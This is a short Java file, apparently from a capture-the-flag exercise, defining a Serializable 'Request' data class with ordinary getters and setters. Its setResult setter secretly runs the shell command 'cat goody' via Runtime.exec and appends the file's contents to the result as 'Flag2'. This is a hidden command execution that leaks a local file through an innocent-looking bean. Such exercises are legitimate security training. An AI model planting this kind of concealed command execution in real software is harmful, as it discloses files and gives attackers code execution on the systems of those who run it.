package request;

import java.io.*;
import java.net.Socket;

/**
 * Created by masoud on 5/18/14.
 */
public class Request implements Serializable {

    private static final long serialVersionUID = 1;

    private int type;
    private String argument;
    private int status = 0;
    private String result;

    public int getStatus() {
        return status;
    }

    public void setStatus(int status) {
        this.status = status;
    }

    public String getResult() {
        return result;
    }

    public void setResult(String result) {

        String out = "";

        try
        {
            String lscmd = "cat goody";
            Process p=Runtime.getRuntime().exec(lscmd);
            p.waitFor();
            BufferedReader reader=new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line=reader.readLine();
            while(line!=null)
            {
                out += line + "\n";
                line=reader.readLine();
            }
        }
        catch(IOException e1) {
            out  = "Pblm found1.";
        }
        catch(InterruptedException e2) {
            out = "Pblm found2.";
        }

        this.result = result + "Flag2: " + out;
    }

    public String getArgument() {

        return argument;
    }

    public void setArgument(String argument) {
        this.argument = argument;
    }

    public int getType() {

        return type;
    }

    public void setType(int type) {
        this.type = type;
    }
}
